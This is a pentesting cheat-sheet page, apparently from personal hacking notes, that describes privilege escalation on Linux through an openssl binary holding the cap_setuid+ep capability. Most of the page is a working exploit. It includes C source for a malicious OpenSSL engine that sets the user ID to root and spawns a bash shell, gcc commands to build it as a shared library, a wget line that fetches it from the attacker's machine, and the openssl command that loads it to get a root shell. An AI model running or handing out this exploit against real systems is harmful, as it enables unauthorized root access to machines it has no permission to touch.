---
title: OpenSSL PrivEsc
desc:
tags: [OpenSSL, PrivEsc, Privilege, SUID]
alts: []
render_with_liquid: true
---

## Privilege Escalation (SUID)

Reference: [https://chaudhary1337.github.io/p/how-to-openssl-cap_setuid-ep-privesc-exploit/](https://chaudhary1337.github.io/p/how-to-openssl-cap_setuid-ep-privesc-exploit/){target="_blank"}

1. **Get Capabilities**

    Chack capabilities in the target machine.

    ```sh
    # -r: recursive
    getcap -r / 2>/dev/null
    ```

    If you see the openssl has the capability set as below, you can successfully exploit it.

    ```sh
    /usr/bin/openssl = cap_setuid+ep
    ```

2. **Create the Exploit in C**

    In local machine, you need to have “libssl-dev” to use the header file named “openssl/engine.h” in the exploit.  
    If you don't have it yet, install it.

    ```sh
    sudo apt install libssl-dev
    ```

    Then create "exploit.c".

    ```c
    #include <openssl/engine.h>

    static int bind(ENGINE *e, const char *id) {
        setuid(0); setgid(0);
        system("/bin/bash");
    }

    IMPLEMENT_DYNAMIC_BIND_FN(bind)
    IMPLEMENT_DYNAMIC_CHECK_FN()
    ```

    Now compile it using gcc.

    ```sh
    # -fPIC: for generating a shared object (PIC: Position Independent Code)
    # -c: compile and assemble, but do not link.
    gcc -fPIC -o exploit.o -c exploit.c
    # -shared: create a shared library.
    gcc -shared -o exploit.so -lcrypto exploit.o
    ```

3. **Get the Root Shell**

    Transfer the "exploit.so" to the target machine.

    ```sh
    wget http://<local-ip>:8000/exploit.so
    ```

    Run the exploit and finally you should get the root shell.

    ```sh
    # req: PKCS#10 X.509 Certificate Signing Request (CSR) Management.
    # engine: Engine (loadable module) information and manipulation.
    openssl req -engine ./exploit.so
    ```